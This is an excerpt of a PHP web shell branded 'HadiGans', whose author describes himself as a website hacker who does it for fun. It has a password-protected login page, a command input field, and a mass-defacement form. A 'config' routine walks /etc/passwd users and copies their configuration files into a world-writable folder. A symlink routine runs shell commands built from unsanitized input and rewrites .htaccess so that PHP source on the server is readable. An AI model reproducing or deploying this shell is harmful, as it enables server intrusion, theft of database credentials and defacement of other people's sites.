...
/* Configurasi */
$auth_pass 			= "d8c33525806fc806feb1cc159cd35896";   // Hadi Gans lu buriq
$color 				= "#00ff00";
...
<html>
	<head>
		...
		<meta name="copyright" content="HadiGans"/>
		<title>HadiGanss</title>
		<link rel='icon' type='image/png' href='https://image.ibb.co/fhCtfT/IMG_20180528_143431_151.jpg'/>
	...
	<body class="bg-dark text-light">
		<center>
			<div class="container" style="margin-top: 15%">
				<div class="col-lg-6">
					<div class="form-group">
						<h1 class='text-center'>
							<a href='https://facebook.com/404.hi' style='color:#ffffff;'>HadiGans
						</h1>
				...
				</div><br/><a href="https://www.hadigans.ga" class="text-muted">Copyright 2019 @Hadigans</a><br/>
			</div>
		</center>
	</body>
</html>
...
<html>
	...
	<body class='bg-dark text-light'>
		...
		<nav class='navbar static-top navbar-dark'>
			...
			<div class='collapse navbar-collapse' id='info'>
				<ul>
					<a href='https://facebook.com/404.hi' class='lain'><i class='fa fa-facebook tambah'></i></a>
					<a href='https://www.instagram.com/hadi07.id' class='lain'><i class='fa fa-instagram tambah'></i></a>
					<a href='https://www.youtube.com/•Hadi •' class='lain'><i class='fa fa-youtube-play tambah'></i></a>
					<a href='https://github.com/hadigans97' class='lain'><i class='fa fa-github tambah'></i></a>
					<a href='https://www.hadigans.ga' class='lain'><i class='fa fa-globe tambah'></i></a>
				</ul>
			</div>
		</nav>
		<div class='container'>
			<h1 class='text-center'><a href='https://facebook.com/404.hi' style='color:#ffffff;'>HadiGans</h1>
			...
			<div class='row'>
				<div class='col-lg-4'><br/>
					...
					<form>
						<input type='text' class='form-control' name='cmd' placeholder='Hacked By Hadi'>
					</form>
		...
		if (isset($_GET['about'])) {
			echo '<div class="card text-center bg-light about">
				<h4 class="card-header">{ Hadi }</h4>
				<div class="card-body">
					<center><div class="img"></div></center>
					<p class="card-text">{ Hadi } Saya Adalah seorang peretas website. Saya Mmeretas Untuk Kesenangan Saya:)</p>
				</div>
				<div class="card-footer">
					<p class="card-text"><small class="text-muted">Copyright 2019 HadiGans</small></p>
				</div>
			</div><br/>';
			exit;
		}
	...
	if($_GET['aksi'] == 'masdef') {
		...
		echo "</textarea><br/>";
			...
			echo "<form method='post'>
				...
				<textarea name='script' class='form-control' rows='5' placeholder='[Ex] Hacked By Hadi'></textarea><br/>
	...
	*/
	if($_GET['aksi'] == 'config') {
		...
		$con = mkdir("hadigans_config", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("hadigans_config/.htaccess","w");
		fwrite($htc, $isi_htc);
		while($passwd = fgets($etc)) {
			if($passwd == "" || !$etc) {
					...
					if(is_readable($user_config_dir)) {
						...
						foreach($grab_config as $config => $nama_config) {
							...
							if($ambil_config == '') {
								...
								$file_config = fopen("hadigans_config/$user_con-$nama_config.txt","w");
		...
		echo "<center><a href='?dir=$path/hadigans_config'><font color=lime>Done</font></a></center>";
		exit;
	}
	...
	*/
	...
	if ($_GET['aksi'] == 'sym_404'){
		...
		if($_POST['execute']){
			rmdir("hadigans_sym404");
			mkdir("hadigans_sym404", 0777);
			$dir = $_POST['dir'];
			$isi = $_POST['isi'];
			system("ln -s ".$dir."hadigans_sym404/".$isi);
			symlink($dir,"hadigans_sym404/".$isi);
			$inija = fopen("hadigans_sym404/.htaccess", "w");
			fwrite($inija,"ReadmeName ".$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any");
			echo'<a href="/hadigans_sym404/" target="_blank"> >>Sukses<< </a>';
		}
		exit;
	}
	...
	if ($_GET['aksi'] == 'bypascf') {
		...
		echo '</table></div><hr/><a href="https://facebook.com/404.hi" class="text-muted">Copyright 2019 Hadigans</a></center><br/>';	
